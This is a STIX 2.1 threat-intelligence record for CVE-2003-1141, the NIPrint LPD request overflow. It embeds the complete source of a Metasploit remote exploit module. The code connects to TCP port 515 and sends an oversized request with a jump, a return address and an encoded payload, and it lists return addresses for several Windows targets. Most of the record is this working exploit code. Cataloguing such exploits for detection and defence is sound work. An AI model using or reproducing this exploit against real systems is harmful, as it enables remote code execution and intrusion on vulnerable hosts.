{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d2fc39a-448e-4604-a19a-61b2187715c9",
    "created": "2024-08-14T16:55:58.398165Z",
    "modified": "2024-08-14T16:55:58.398169Z",
    "name": "NIPrint LPD Request Overflow",
    "description": " This module exploits a stack buffer overflow in the Network Instrument NIPrint LPD service. Inspired by Immunity's VisualSploit :-) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/lpd/niprint.rb",
            "external_id": "niprint.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2003-1141"
        },
        {
            "source_name": "reference",
            "url": "http://www.immunitysec.com/documentation/vs_niprint.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NIPrint LPD Request Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the\n        Network Instrument NIPrint LPD service. Inspired by\n        Immunity's VisualSploit :-)\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2003-1141'],\n          ['OSVDB', '2774'],\n          ['BID', '8968'],\n          ['URL',   'http://www.immunitysec.com/documentation/vs_niprint.html'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 500,\n          'BadChars' => \"\\x00\\x0a\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['NIPrint3.EXE (TDS:0x3a045ff2)', { 'Ret' => 0x00404236 }], # jmp esi\n          ['Windows XP SP3', { 'Ret' => 0x7C9D30E3 }],\n          ['Windows 7 x64', { 'Ret' => 0x763B35DD }],\n        ],\n      'DefaultTarget' => 0,\n      'DisclosureDate' => '2003-11-05'))\n\n    register_options(\n      [\n        Opt::RPORT(515)\n      ])\n  end\n\n  def exploit\n    connect\n\n    req = rand_text_alphanumeric(8192)\n    req[  0, 2] = \"\\xeb\\x33\"\n    req[ 49, 4] = [target.ret].pack('V')\n    req[ 53, payload.encoded.length ] = payload.encoded\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(req)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2003-11-05",
    "x_mitre_platforms": [
        "win'"
    ]
}